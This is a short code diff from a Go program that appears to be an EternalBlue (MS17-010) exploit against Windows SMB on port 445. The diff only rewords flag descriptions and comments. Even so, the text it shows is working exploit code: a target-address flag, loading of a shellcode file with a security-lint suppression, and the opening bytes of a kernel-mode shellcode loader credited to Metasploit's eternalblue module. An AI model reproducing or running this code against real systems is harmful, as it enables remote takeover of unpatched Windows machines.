@@ -17,8 +17,8 @@ func main() {
 		address   string
 		shellcode string
 	)
-	flag.StringVar(&address, "addr", "127.0.0.1:445", "target")
-	flag.StringVar(&shellcode, "sc", "shellcode.bin", "shellcode file")
+	flag.StringVar(&address, "addr", "127.0.0.1:445", "target host address")
+	flag.StringVar(&shellcode, "sc", "shellcode.bin", "shellcode file path")
 	flag.Parse()
 
 	sc, err := ioutil.ReadFile(shellcode) // #nosec
@@ -1005,7 +1005,10 @@ func makeZero(size int) []byte {
 	return bytes.Repeat([]byte{0}, size)
 }
 
-// loader is used to run user mode shellcode in the kernel mode
+// loader is used to run user mode shellcode in the kernel mode.
+// reference Metasploit-Framework:
+// file: msf/external/source/shellcode/windows/multi_arch_kernel_queue_apc.asm
+// binary: modules/exploits/windows/smb/ms17_010_eternalblue.rb: def make_kernel_shellcode
 var loader = [...]byte{
 	0x31, 0xC9, 0x41, 0xE2, 0x01, 0xC3, 0xB9, 0x82, 0x00, 0x00, 0xC0, 0x0F, 0x32, 0x48, 0xBB, 0xF8,
 	0x0F, 0xD0, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x89, 0x53, 0x04, 0x89, 0x03, 0x48, 0x8D, 0x05, 0x0A,
